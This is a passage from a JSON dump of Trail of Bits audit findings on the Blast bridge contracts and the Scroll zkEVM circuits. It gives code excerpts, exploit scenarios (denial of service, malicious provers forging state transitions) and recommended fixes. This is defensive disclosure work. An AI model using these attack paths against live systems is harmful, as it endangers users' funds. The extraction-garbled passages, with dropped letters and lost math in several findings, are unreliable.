bridge. However, on Blast, ETH yield token deposits, such as deposits of stETH, do not go through the L1CrossDomainMessenger . Instead, they directly go through the OptimismPortal.depositTransaction function (gure 2.1). This function is used because stETH deposits on L1 must result in minted ETH instead of ERC-20 tokens on L2. To access such behavior, the system cannot go through the L1CrossDomainMessenger . Because of this deviation, the callee on L2 is not the L2CrossDomainMessenger.relayMessage function; instead, it is the L2BlastBridge.finalizeETHBridgeDirect function. If this function reverts, the L2 ETH will be locked on the bridge and the user will have no way to gain access to it. function _initiateBridgeERC20 ( address _localToken , address _remoteToken , address _from , address _to , uint256 _amount , uint32 _minGasLimit , bytes memory _extraData ) internal override { YieldToken memory usdYieldToken = usdYieldTokens[_localToken]; YieldToken memory ethYieldToken = ethYieldTokens[_localToken]; if (usdYieldToken.approved) { [...] } else if (ethYieldToken.approved) { [...] // Message has to be sent to the OptimismPortal directly because we have to // request the L2 message has value without sending ETH. portal.depositTransaction( Predeploys.L2_BLAST_BRIDGE, _amount, RECEIVE_DEFAULT_GAS_LIMIT, false , abi.encodeWithSelector( L2BlastBridge.finalizeBridgeETHDirect.selector, _from, _to, USDConversions._convertDecimals(_amount, ethYieldToken.decimals, USDConversions.WAD_DECIMALS), _extraData ) ); [...] } Figure 2.1: ETH yield token deposits bypass the L1CrossDomainMessenger . ( optimism/packages/contracts-bedrock/src/mainnet-bridge/L1BlastBridge.sol #L161-L241 ) Recommendations Short term, update any user- and developer-facing documentation to inform developers that ETH transfers on L2, especially when ETH yield tokens are deposited on L1, must not revert. Long term, formally enumerate the invariants introduced across Blast. This may help prevent invariants from being violated with future changes to code, enable deeper internal security review, and assist external developers. 3. Insu\u0000cient funds may be available for user withdrawals Severity: Low Diculty: Low Type: Data Validation Finding ID: TOB-BLAST-3 Target: optimism/packages/contracts-bedrock/src/mainnet-bridge/yield-provide rs/LidoYieldProvider.sol , optimism/packages/contracts-bedrock/src/mainnet-bridge/yield-provide rs/DSRYieldProvider.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. ETH yield token user deposits lose replay capabilities on the L2 bridge ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-metalayerblast-securityreview.pdf", "body": "ETH yield token deposits on the Blast bridge do not use the L1CrossDomainMessenger component to relay the message to L2. As a result, the default transaction replay capabilities provided by the messenger are not available to users. On Optimism, the traditional ow for token deposits is for the L1 bridge to call the L1CrossDomainMessenger.sendMessage function. Internally, the messenger will invoke the OptimismPortal.depositTransaction function, where the calldata for the L2 side is for the L2CrossDomainMessenger.relayMessage function (gure 2.1). The relayMessage function provides transaction replay capabilities if the original transaction fails to execute successfully. These capabilities ensure that users funds do not become locked in the bridge. However, on Blast, ETH yield token deposits, such as deposits of stETH, do not go through the L1CrossDomainMessenger . Instead, they directly go through the OptimismPortal.depositTransaction function (gure 2.1). This function is used because stETH deposits on L1 must result in minted ETH instead of ERC-20 tokens on L2. To access such behavior, the system cannot go through the L1CrossDomainMessenger . Because of this deviation, the callee on L2 is not the L2CrossDomainMessenger.relayMessage function; instead, it is the L2BlastBridge.finalizeETHBridgeDirect function. If this function reverts, the L2 ETH will be locked on the bridge and the user will have no way to gain access to it. function _initiateBridgeERC20 ( address _localToken , address _remoteToken , address _from , address _to , uint256 _amount , uint32 _minGasLimit , bytes memory _extraData ) internal override { YieldToken memory usdYieldToken = usdYieldTokens[_localToken]; YieldToken memory ethYieldToken = ethYieldTokens[_localToken]; if (usdYieldToken.approved) { [...] } else if (ethYieldToken.approved) { [...] // Message has to be sent to the OptimismPortal directly because we have to // request the L2 message has value without sending ETH. portal.depositTransaction( Predeploys.L2_BLAST_BRIDGE, _amount, RECEIVE_DEFAULT_GAS_LIMIT, false , abi.encodeWithSelector( L2BlastBridge.finalizeBridgeETHDirect.selector, _from, _to, USDConversions._convertDecimals(_amount, ethYieldToken.decimals, USDConversions.WAD_DECIMALS), _extraData ) ); [...] } Figure 2.1: ETH yield token deposits bypass the L1CrossDomainMessenger . ( optimism/packages/contracts-bedrock/src/mainnet-bridge/L1BlastBridge.sol #L161-L241 ) Recommendations Short term, update any user- and developer-facing documentation to inform developers that ETH transfers on L2, especially when ETH yield tokens are deposited on L1, must not revert. Long term, formally enumerate the invariants introduced across Blast. This may help prevent invariants from being violated with future changes to code, enable deeper internal security review, and assist external developers.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Insu\u0000cient funds may be available for user withdrawals ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-metalayerblast-securityreview.pdf", "body": "The Lido and DSR yield providers might stake more funds than what is available, which could prevent user withdrawals from being nalized. The LidoYieldProvider and DSRYieldProvider contracts are responsible for staking funds that are available in their respective yield managers into Lido and the DSR pot, respectively. For example, the LidoYieldProvider.stake function rst checks that the amount of funds to stake is less than the available ETH balance in the ETHYieldManager (gure 3.1). Then, the function calls Lido to stake the necessary amount. /// @inheritdoc YieldProvider function stake ( uint256 amount ) external override onlyDelegateCall { if ( amount > YIELD_MANAGER.lockedValue() ) { revert InsufficientStakableFunds(); } LIDO.submit{value: amount}( address ( 0 )); } Figure 3.1: The stake function may stake more funds than what is available in the ETHYieldManager . ( optimism/packages/contracts-bedrock/src/mainnet-bridge/yield-providers/L idoYieldProvider.sol#L73-L79 ) However, the function does not take into account the amount of ETH that is locked by the WithdrawalQueue to complete any outstanding withdrawals. Thus, the Blast admin could stake more than the available liquidity in the ETHYieldManager . Doing so would aect the solvency of the bridge temporarily since users may be unable to nalize their withdrawals. Note that this issue also exists in the DSRYieldManager . Exploit Scenario Alice, the Blast admin, calls the ETHYieldManager.stake function with an amount that is more than what is available (including locked funds for withdrawals). Bob, a user of Blast, attempts to nalize his withdrawal request but is unable to do so because there are not enough funds left in the ETHYieldManager . Recommendations Short term, update the LidoYieldProvider.stake (gure 3.2) and DSRYieldProvider.stake (gure 3.3) functions as follows: /// @inheritdoc YieldProvider function stake ( uint256 amount ) external override onlyDelegateCall { if ( amount > YIELD_MANAGER.getTokenBalance() ) { revert InsufficientStakableFunds(); } LIDO.submit{value: amount}( address ( 0 )); } Figure 3.2: This corrected version of the LidoYieldProvider.stake function ensures that only liquid funds are used for staking. /// @inheritdoc YieldProvider function stake ( uint256 amount ) external override onlyDelegateCall { if ( amount > YIELD_MANAGER.getTokenBalance() ) { revert InsufficientStakableFunds(); } if (amount > 0 ) { DSR_MANAGER.join( address (YIELD_MANAGER), amount); } } Figure 3.3: This corrected version of the DSRYieldProvider.stake function ensures that only liquid funds are used for staking. Long term, document all invariants of the system, including those pertaining to token accounting and solvency. Ensure that testing can validate these invariants and cover all edge cases.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. Possible denial-of-service vector through pre-deployed contract storage writes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-metalayerblast-securityreview.pdf", "body": "Blast tracks share prices and counts for each account address using pre-deployed contracts that are set within the chains genesis block. As the EVM executes a transaction, it uses Blasts GasTracker provider to track gas rewards to disperse to developers. The refund provided on gas oers an incentive for developers to adopt Blast as their L2 solution. However, Blasts pre-deployed contracts getter and setter functions for these parameters use Ethereum account storage. Because storage writes are computationally expensive operations (due to the triggering of expensive account trie updates), the pre-deployed contracts should charge an appropriate amount in gas costs for each storage write to nancially disincentivize attackers from leveraging them as a denial-of-service attack vectors, slowing down transaction processing rates. Currently, Blast performs multiple account storage writes per unique contract address executed during a transaction. Thus, an attacker may attempt to perform a long list of calls in a transaction in an attempt to trigger storage writes. They may perform more calls than the maximum stack depth by adding a depth limit and iterating over a list of contracts at each depth level. The severity of this issue is undetermined, as the feasibility of this attack was not determined during the course of this review. We rated the attack complexity as high for the following reasons:    Contract deployments will be costly to the attacker. Performing the call afterwards will add additional nancial overhead for the attacker, due to the number of calls performed. There must be a nancial incentive to perform a denial-of-service attack that produces a larger return than the money spent. When considering practical attack scenarios, note that some systems involving the pooling of assets (e.g., a liquidity pool) and uctuating asset pricing based on availability may provide an incentive, if an attacker can disallow other users from funding a pool for some time. Recommendations Short term, evaluate the total aggregate cost of such attacks for a given number of contracts/calls to determine whether any attacks may be nancially feasible. This could be done by subtracting the cost of the storage write operations from the amount refunded, but in practice, some refunds may not cover the cost fully. Doing so would only narrow the constraints for such attacks and may not eliminate them. As a result of design constraints within Blast, it may be dicult to nd viable solutions. Blast holds interest in maintaining EVM compliance such that traditional gas costs that inuence the number of instructions that will be executed before gas runs out will not be violated. As a result, Blasts gas refunds were developed to occur alongside traditional Ethereum gas computations and are applied only at the end of transactions. Otherwise, the most ideal solution would be to immediately charge for the storage writes or ensure that enough gas is provided to account for them so that they are always accounted for. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "2. Use of account_hash_traces cells does not match specication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "The old_account_hash_traces and new_account_hash_traces arrays each contain triples of cells corresponding to input and output values of the Poseidon hash function. These arrays are populated by the account_hash_traces function, a portion of which is shown in gure 2.1. let mut account_hash_traces = [[Fr::zero(); 3]; 6]; account_hash_traces[0] = [codehash_hi, codehash_lo, h1]; account_hash_traces[1] = [storage_root, h1, h2]; account_hash_traces[2] = [nonce_and_codesize, balance, h3]; account_hash_traces[3] = [h3, h2, h4]; // account_hash_traces[4] = [h4, poseidon_codehash, account_hash]; account_hash_traces[5] = [ account_key, account_hash, domain_hash(account_key, account_hash, HashDomain::Leaf), ]; account_hash_traces Figure 2.1: src/types.rs#512523 This assignment does not match the specication in the mpt-proof.md specication, shown in gure 2.2. - `old_account_hash_traces`: Vector with item in `[[Fr; 3]; 6]`. For non-empty account - `[codehash_hi, codehash_lo, h1=hash(codehash_hi, codehash_lo)]` - `[h1, storage_root, h2=hash(h1, storage_root)]` - `[nonce, balance, h3=hash(nonce, balance)]` - `[h3, h2, h4=hash(h3, h2)]` - `[1, account_key, h5=hash(1, account_key)]` - `[h4, h5, h6=hash(h4, h5)]` Figure 2.2: spec/mpt-proof.md#131137 It appears that the version implemented in account_hash_traces matches the use in the rest of the circuit. For example, the snippet shown in gure 2.3 uses the expression old_account_hash_traces[1][0] to retrieve the value old_storage_root. ClaimKind::Storage { .. } | ClaimKind::IsEmpty(Some(_)) => self.old_account.map(|_| { let old_account_hash = old_account_hash_traces[5][1]; let old_h4 = old_account_hash_traces[4][0]; let old_h2 = old_account_hash_traces[1][2]; let old_storage_root = old_account_hash_traces[1][0]; vec![old_account_hash, old_h4, old_h2, old_storage_root] Figure 2.3: src/types.rs#642647 However, this pattern of referring to values in the account_hash_traces arrays by their indices is error-prone and dicult to check completely. Recommendations Short term, update the specication document to reect the current use of these arrays. Long term, replace ad hoc indexing with a struct that has named elds.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "3. hash_traces skips invalid leaf hashes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "The hash_traces function takes a collection of Proof objects and returns an array of the Poseidon hash calls included in those objects, in a format suitable for lookups into the Poseidon table. For hashes in account leaf nodes, the correct domain is chosen by trial and error, as shown in gure 3.1. for account_leaf_hash_traces in [proof.old_account_hash_traces, proof.new_account_hash_traces] { for [left, right, digest] in account_leaf_hash_traces { if domain_hash(left, right, HashDomain::AccountFields) == digest { hash_traces.push(([left, right], HashDomain::AccountFields.into(), digest)) } else if domain_hash(left, right, HashDomain::Leaf) == digest { hash_traces.push(([left, right], HashDomain::Leaf.into(), digest)) } else if domain_hash(left, right, HashDomain::Pair) == digest { hash_traces.push(([left, right], HashDomain::Pair.into(), digest)) } } } } hash_traces Figure 3.1: mpt-circuit/src/gadgets/mpt_update.rs#20942108 If the hash does not match any domain, no entry is added to the returned list. This function is publicly exposed, and if it is used for certain purposes, such as generating the lookups in a circuit, it could lead to an underconstrained hash witness. hash_traces appears to be used only in a testing context, so it does not currently cause any security concerns. Recommendations Short term, add handling for all cases to hash_traces, and explicitly document when it should and should not be used. Long term, document all public functions and provide clear directions for when they should and should not be used.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "4. Values in chunk_is_valid_cells are not constrained to be Boolean ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "The cells in the chunk_is_valid_cells vector indicate whether a chunk is real or padded. A padded chunk is simply a copy of the last real chunk. For each chunk, some checks are performed depending on whether it is valid. Currently, the chunk_is_valid_cells values are not constrained to be Boolean. When used in conditional equality checks, the lack of Boolean enforcement does not pose a problem because the constraint required for the conditional equality forces either the conditioning value to be 0 or the dierence of the values under comparison to be 0. However, chunk_is_valid_cells is also used to compute the number of valid cells in a batch. The num_valid_snarks function, shown in gure 4.1, takes the chunk_are_valid argument, which is called with the chunk_is_valid_cells value. fn num_valid_snarks( rlc_config: &RlcConfig, region: &mut Region<Fr>, chunk_are_valid: &[AssignedCell<Fr, Fr>], offset: &mut usize, ) -> Result<AssignedCell<Fr, Fr>, halo2_proofs::plonk::Error> { let mut res = chunk_are_valid[0].clone(); for e in chunk_are_valid.iter().skip(1) { res = rlc_config.add(region, &res, e, offset)?; } Ok(res) } Figure 4.1: aggregator/src/core.rs#935946 In practice, the impact of non-Boolean values in chunk_is_valid_cells is limited exclusively to the very rst chunk. Any non-Boolean chunk other than the rst one must satisfy two almost contradictory conditions. First, it must be continuous with the previous chunk; that is, its previous root must be equal to the previous chunks next root, as shown in gure 4.2: // 4 __valid__ chunks are continuous: they are linked via the state roots for i in 0..MAX_AGG_SNARKS - 1 { for j in 0..DIGEST_LEN {  rlc_config.conditional_enforce_equal( &mut region, &chunk_pi_hash_preimages[i + 1][PREV_STATE_ROOT_INDEX + j], &chunk_pi_hash_preimages[i][POST_STATE_ROOT_INDEX + j], &chunk_is_valid_cells[i + 1], &mut offset, )?; } } Figure 4.2: aggregator/src/core.rs#666690 Second, it must have equal public inputs to the previous chunk, as shown in gure 4.3: // 6. chunk[i]'s chunk_pi_hash_rlc_cells == chunk[i-1].chunk_pi_hash_rlc_cells when // chunk[i] is padded let chunks_are_padding = chunk_is_valid_cells .iter() .map(|chunk_is_valid| rlc_config.not(&mut region, chunk_is_valid, &mut offset)) .collect::<Result<Vec<_>, halo2_proofs::plonk::Error>>()?; let chunk_pi_hash_rlc_cells = parse_pi_hash_rlc_cells(data_rlc_cells); for i in 1..MAX_AGG_SNARKS { rlc_config.conditional_enforce_equal( &mut region, chunk_pi_hash_rlc_cells[i - 1], chunk_pi_hash_rlc_cells[i], &chunks_are_padding[i], &mut offset, )?; } Figure 4.3: aggregator/src/core.rs#692709 This requires the previous and next roots to be equal, which may be possible in non-zkEVM uses but which should not be possible in a zkEVM. However, these constraints do not prevent a non-Boolean value for chunk_is_valid_cells[0], so a malicious prover might hope to choose a value for it that enables an exploit. Suppose a batch of nine chunks is being aggregated; in that situation, the prover might hope to generate a proof with the initial and nal state roots of chunks[0..9] but with the batch hash of chunks[0..8], by setting the value of chunk_is_valid_cells[0] to -1. Several other checks must be passed to generate such a proof. First, the batch hash must be the hash corresponding to chunks[0..8]. In this case, the ags (flag1,flag2,flag3) are (0,1,0), so the chunk data hash will correspond to the second potential_batch_data_hash_digest value, as shown in gure 4.4: let rhs = rlc_config.mul( &mut region, &flag1, &potential_batch_data_hash_digest[(3 - i) * 8 + j], &mut offset, )?; let rhs = rlc_config.mul_add( &mut region, &flag2, &potential_batch_data_hash_digest[(3 - i) * 8 + j + 32], &rhs, &mut offset, )?; let rhs = rlc_config.mul_add( &mut region, &flag3, &potential_batch_data_hash_digest[(3 - i) * 8 + j + 64], &rhs, &mut offset, )?; region.constrain_equal( batch_pi_hash_preimage[i * 8 + j + CHUNK_DATA_HASH_INDEX].cell(), rhs.cell(), )?; Figure 4.4: aggregator/src/core.rs#602626 Second, the Keccak input length must equal 8, according to the constraints shown in gure 4.5: let data_hash_inputs_len = rlc_config.mul(&mut region, &num_valid_snarks, &const32, &mut offset)?;  let mut data_hash_inputs_len_rec = rlc_config.mul( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 3], &flag1, &mut offset, )?; data_hash_inputs_len_rec = rlc_config.mul_add( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 4], &flag2, &data_hash_inputs_len_rec, &mut offset, )?; data_hash_inputs_len_rec = rlc_config.mul_add( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 5], &flag3, &data_hash_inputs_len_rec, &mut offset, )?;  region.constrain_equal( data_hash_inputs_len.cell(), data_hash_inputs_len_rec.cell(), )?; Figure 4.5: aggregator/src/core.rs#744804 Third, the RLC of the Keccak data input must match any of the three possible Keccak RLC values. This constraint seems to prevent any practical use of a non-Boolean value for chunk_is_valid_cells[0] because the implementation of RlcConfig::select, shown in gure 4.6, returns the result of (1 - cond) * b + cond * a, which causes values in dierent positions of the RLC vector to be mixed together when cond equals -1. // if cond = 1 return a, else b pub(crate) fn select( &self, region: &mut Region<Fr>, a: &AssignedCell<Fr, Fr>, b: &AssignedCell<Fr, Fr>, cond: &AssignedCell<Fr, Fr>, offset: &mut usize, ) -> Result<AssignedCell<Fr, Fr>, Error> { // (cond - 1) * b + cond * a let cond_not = self.not(region, cond, offset)?; let tmp = self.mul(region, a, cond, offset)?; self.mul_add(region, b, &cond_not, &tmp, offset) } Figure 4.6: This gure shows RlcConfig::select. Note that the comment incorrectly species (cond - 1) instead of (1 - cond), but either version causes the same mixing eect for non-Boolean ags. (aggregator/src/aggregation/rlc/gates.rs#296309) However, care should be taken when modifying the implementation of rlc_with_flag; if it treats all nonzero values of cond the same way, this attack may become possible. Recommendations Short term, add constraints to force the values in chunk_is_valid_cells to be Boolean. Long term, document all cases in which a constraint is enforced due to a combination of several constraints spread across the codebase.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "5. The Sig circuit may reject valid signatures ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "The ecdsa_verify_no_pubkey_check function performs the steps required to verify an  ECDSA signature. The verication procedure requires checking that 1 are intermediary values generated during signature verication and is the public     1 , where and   2  2 key. The signature verication circuit performs these checks by enforcing that the  coordinate of are not equal, as shown in gure 5.1. and     1 2 TODO: Technically they could be equal for a valid signature, but this happens // check u1 * G and u2 * pubkey are not negatives and not equal // with // vanishing probability way // coordinates of u1_mul and u2_mul are in proper bigint form, and lie in but are not // constrained to [0, n) we therefore need hard inequality here let u1_u2_x_eq = base_chip.is_equal(ctx, &u1_mul.x, &u2_mul.x); let u1_u2_not_neg = base_chip.range.gate().not(ctx, Existing(u1_u2_x_eq)); for an ECDSA signature constructed in a standard Figure 5.1: zkevm-circuits/src/sig_circuit/ecdsa.rs#7480 As the comment in the code snippet in gure 5.1 indicates, checking the coordinate for  =   equality will also cause the circuit to be unsatisable on valid signatures where 1 2  .  A specially crafted secret key can be used to trigger this incompleteness vulnerability at will. This issue was also disclosed in a previous audit of the halo2-ecc library for Axiom and Scroll (TOB-AXIOM-4). Exploit Scenario Alice deploys a multisignature bridge contract from another EVM-like blockchain to the Scroll zkEVM. Bob, who is a signing party, wants to be able to maliciously stall the bridge at some future point. Bob generates a secret key in such a way that some specic, otherwise innocuous transaction will fail ecdsa_verify_no_pubkey_check when signed with Bobs key. At a later point, he submits this transaction, which is accepted on the non-Scroll side but which cannot be bridged into the Scroll zkEVM, leading to a denial of service and potentially a loss of funds. Recommendations Short term, modify the circuit to ensure that signatures with  =   1 2  are accepted but signatures with  =    1 2  are rejected. Long term, ensure that optimizations preserve correctness even in adversarial settings.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. assigned_y_tmp is not constrained to be 87 bits ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "Given a signature information in and recovers the ephemeral point Concretely, the circuit returns a value indicating whether the signature is valid and the value . , the ecdsa_verify_no_pubkey_check function uses the parity  corresponding to .  = (, ) (, , )   The Sig circuit then ensures that the recovered value is well formed by enforcing that  indeed captures the oddness of is the rst limb of the value that was satisfying the equation ,  + 2 =  0 previously recovered by ecdsa_verify_no_pubkey_check. Furthermore, 87-bit value to ensure soundness. The code snippet in gure 6.1 shows the last check, where . This is done by showing that there exists a value corresponds to the assigned_y_tmp variable. where    0    must be an // last step we want to constrain assigned_y_tmp is 87 bits ecc_chip .field_chip .range .range_check(ctx, &assigned_y_tmp, 88); Figure 6.1: zkevm-circuits/src/sig_circuit.rs#420424 Contrary to the comment in gure 6.1, the code constraints assigned_y_tmp to be 88 bits instead of 87 bits. However, this issue is unlikely to lead to any soundness issue because the extra bit aorded to malicious provers is not enough to craft an invalid witness that satises the constraints. Recommendations Short term, constrain assigned_y_tmp to be 87 bits. Long term, add negative tests to ensure that invariants are not violated.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "7. Aggregated proof verication algorithm is unspecied ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "The zkEVM proof aggregation circuit architecture described in the aggregator/README.md le includes several instances of proof aggregation, in the form of both direct aggregation of proofs and nested aggregation (i.e., aggregation of already-aggregated proofs). Based on our understanding of the architecture and the implementation, the nal aggregate proof will consist of a triple (_, , ) : 1. _ is the hash of the overall public inputs of the aggregated proofs. 2. 3. is the aggregated all-but-the-pairing proof, which, when veried with a pairing  check, should guarantee that each input proof and all aggregation proofs except the very last one all pass verication. is a SHPLONK proof that  therefore, checking _ are correctly constructed and that, with a pairing in fact veries the overall tree of proofs. and   However, the actual details of how to construct and verify this triple are not clearly specied, documented, or implemented. There are testing-focused macros in the aggregator/src/tests.rs le that implement proof generation followed immediately by verication; the dierent components of the proof are represented by the macros layer_0, compression_layer_snark, compression_layer_evm, and aggregation_layer_snark. However, there are no distinct implementations of procedures for the following:  Proving and verifying key generation  Proof generation using the proving key and a witness  Verication using the verication key and a proof Implementing each of these procedures distinctly, especially the key generation and verication procedures, is critical for evaluating the soundness of the aggregate proof system. Even if there are not specic problems in the aggregation or compression circuits, there may be catastrophic issues if vital checks are unintentionally skipped; for example, for key generation to be correct, the verication keys of inner circuits must be constants in the outer circuits, and in the verication algorithm, both the aggregated proof and the outermost aggregation proof must be checked. Recommendations Short term, develop, implement, and review a clear specication of the proof aggregation circuit. Long term, explicitly document the intended security properties of the zkEVM aggregated proof, and connect those properties to the specication with security proofs or proof sketches. For example, a rough sketch for the compression circuit may look like the following: Intended security property: Verifying the compression circuit applied to circuit  should prove knowledge of a valid all-but-the-pairing SHPLONK proof for specically for ,   (and ), which has specic public inputs, potentially has an accumulator and has several polynomial opening proofs, all of which are aggregated   together into an overall accumulator  pairing check on . satises the circuit  . After verifying the compression circuit, a should prove that there exists a witness assignment  that is guaranteed because the compression  Proof sketch: Knowledge of the proof for circuit includes a SHPLONK all-but-the-pairing verier, and the verication key for  is a constant in the compression circuit, which is written into the transcript during in-circuit verication. Correct accumulation is guaranteed because the compression circuit includes an accumulation verier for polynomial commitment multi-opening proofs, which checks that the public input Thus, verifying the compression circuit and performing a pairing check on  proves that there exists a witness assignment is a correctly accumulated proof.  that satises .  ", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "8. Aggregation prover veries each aggregated proof ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "The zkEVM proof aggregation algorithms combine several all-but-the-pairing proofs into a single all-but-the-pairing proof which, when veried with a pairing, simultaneously veries all the constituent proofs. As sanity check measures, the functions extract_accumulators_and_proof, AggregationCircuit::new, and CompressionCircuit::new perform a pairing check on each aggregated input proof and on the outer aggregated proof, as shown in gures 8.1, 8.2, and 8.3. for (i, acc) in accumulators.iter().enumerate() { let KzgAccumulator { lhs, rhs } = acc; let left = Bn256::pairing(lhs, g2); let right = Bn256::pairing(rhs, s_g2); log::trace!(\"acc extraction {}-th acc check: left {:?}\", i, left); log::trace!(\"acc extraction {}-th acc check: right {:?}\", i, right); if left != right { return Err(snark_verifier::Error::AssertionFailure(format!( \"accumulator check failed {left:?} {right:?}, index {i}\", ))); } //assert_eq!(left, right, \"accumulator check failed\"); } Figure 8.1: Pairing calls in extract_accumulators_and_proof (aggregator/src/core.rs#7587) let left = Bn256::pairing(&lhs, &params.g2()); let right = Bn256::pairing(&rhs, &params.s_g2()); log::trace!(\"aggregation circuit acc check: left {:?}\", left); log::trace!(\"aggregation circuit acc check: right {:?}\", right); if left != right { return Err(snark_verifier::Error::AssertionFailure(format!( \"accumulator check failed {left:?} {right:?}\", ))); } Figure 8.2: Pairing calls in AggregationCircuit::new (aggregator/src/aggregation/circuit.rs#110118) let left = Bn256::pairing(&lhs, &params.g2()); let right = Bn256::pairing(&rhs, &params.s_g2()); log::trace!(\"compression circuit acc check: left {:?}\", left); log::trace!(\"compression circuit acc check: right {:?}\", right); if left != right { return Err(snark_verifier::Error::AssertionFailure(format!( \"accumulator check failed {left:?} {right:?}\", ))); } Figure 8.3: Pairing calls in CompressionCircuit::new (aggregator/src/compression/circuit.rs#205214) These checks prevent developers from writing negative tests; for example, they would block a test that aggregates an incorrect proof with many correct proofs and then checks that the result does not pass verication. In addition, pairing calls tend to be expensive to compute, so these calls may unnecessarily decrease prover performance. Recommendations Short term, make these checks conditional, either with a feature ag or a function parameter; then, write negative tests for aggregation and compression. Long term, ensure that security-critical features such as aggregation verication can be tested both positively and negatively.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "9. KECCAK_ROWS environment variable may disagree with DEFAULT_KECCAK_ROWS constant ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "The number of rows per round of the Keccak-f box in the Keccak table is represented by the DEFAULT_KECCAK_ROWS constant in the aggregator crate and is used via the calculated ROWS_PER_ROUND constant to extract data from the Keccak table, as shown in gure 9.1: if offset % ROWS_PER_ROUND == 0 && offset / ROWS_PER_ROUND <= MAX_KECCAK_ROUNDS { // first column is is_final is_final_cells.push(row[0].clone()); // second column is data rlc data_rlc_cells.push(row[1].clone()); // third column is hash len hash_input_len_cells.push(row[2].clone()); } Figure 9.1: aggregator/src/core.rs#253261 However, the ROWS_PER_ROUND constant is not guaranteed to match the parameters of the Keccak circuit, and in fact, the rows-per-round parameter of the Keccak circuit is read from the KECCAK_ROWS environment variable multiple times while the circuit is being constructed, as shown in gures 9.2 and 9.3. pub(crate) fn get_num_rows_per_round() -> usize { var(\"KECCAK_ROWS\") .unwrap_or_else(|_| format!(\"{DEFAULT_KECCAK_ROWS}\")) .parse() .expect(\"Cannot parse KECCAK_ROWS env var as usize\") } Figure 9.2: zkevm-circuits/src/keccak_circuit/keccak_packed_multi.rs#15 for p in 0..3 { column_starts[p] = cell_manager.start_region(); let mut row_idx = 0; for j in 0..5 { for _ in 0..num_word_parts { for i in 0..5 { rho_pi_chi_cells[p][i][j] .push(cell_manager.query_cell_value_at_row(row_idx as i32)); } row_idx = (row_idx + 1) % get_num_rows_per_round(); } } } Figure 9.3: A loop that repeatedly reads the KECCAK_ROWS environment variable (zkevm-circuits/src/keccak_circuit/keccak_packed_multi.rs#677689) If this environment variable is incorrect when the verication key is generated, or if it changes during the layout phase, a potentially incorrect circuit may be generated. However, this type of change would aect many parts of the code, including the witness generation implementation, and is unlikely to pass even basic tests. Because of that, we do not consider this to be a plausible soundness problem. However, a prover whose environment sets KECCAK_ROWS to an incorrect value would consistently fail to create proofs, causing a potential denial-of-service attack vector. For example, running the command KECCAK_ROWS=20 cargo test release test_aggregation_circuit in the aggregator/ folder fails on the assertion shown in gure 9.4: assert_eq!( columns.len(), 87, \"cell manager configuration does not match the hard coded setup\" ); Figure 9.4: aggregator/src/aggregation/config.rs#9094 We did not explore other options for KECCAK_ROWS or more sophisticated attack scenarios such as changing the KECCAK_ROWS environment variable during prover execution. Exploit Scenario Alice runs a sequencer for the Scroll zkEVM. Bob convinces her to install an MEV optimizer, which under normal conditions behaves normally. However, the optimizer software sets KECCAK_ROWS to other values whenever Bob wishes, causing Alice to consistently fail to generate proofs, causing a denial of service. Recommendations Short term, change get_num_rows_per_round so that it reads KECCAK_ROWS only once (e.g., with lazy_static), and add assertions to the aggregator codebase to make sure that KECCAK_ROWS equals DEFAULT_KECCAK_ROWS. Long term, document all conguration parameters for the zkEVM circuits and any required relationships between them.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Incorrect state transitions can be proven for any chunk by manipulating padding ags ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "Due to insucient constraints in the aggregation circuits padding logic, a malicious prover can generate two types of invalid proofs: 1. For any chunk A, a malicious prover can prove that the empty batch steps from A.prev_root to A.next_root. 2. For any pair of chunks (A,B) that is continuous (i.e., A.next_root equals B.prev_root), and any choice of data hash evil_data_hash, a malicious prover can generate an aggregated proof in which batch_prev_root equals A.prev_root, batch_next_root equals B.next_root, and batch_data_hash equals keccak(evil_data_hash). Attack 1 is problematic but unlikely to occur in practice unless empty batches or sub-batches are allowed to cause state updates. Attack 2 is extremely severe because it allows a malicious prover to prove that any data_hash has almost any state transition. Due to time constraints, we were not able to develop proof-of-concept exploits demonstrating these two attacks, but we believe that such exploits are possible. The aggregation circuit takes a sequence of SNARKs ,...,   1  is intended to be a Boolean 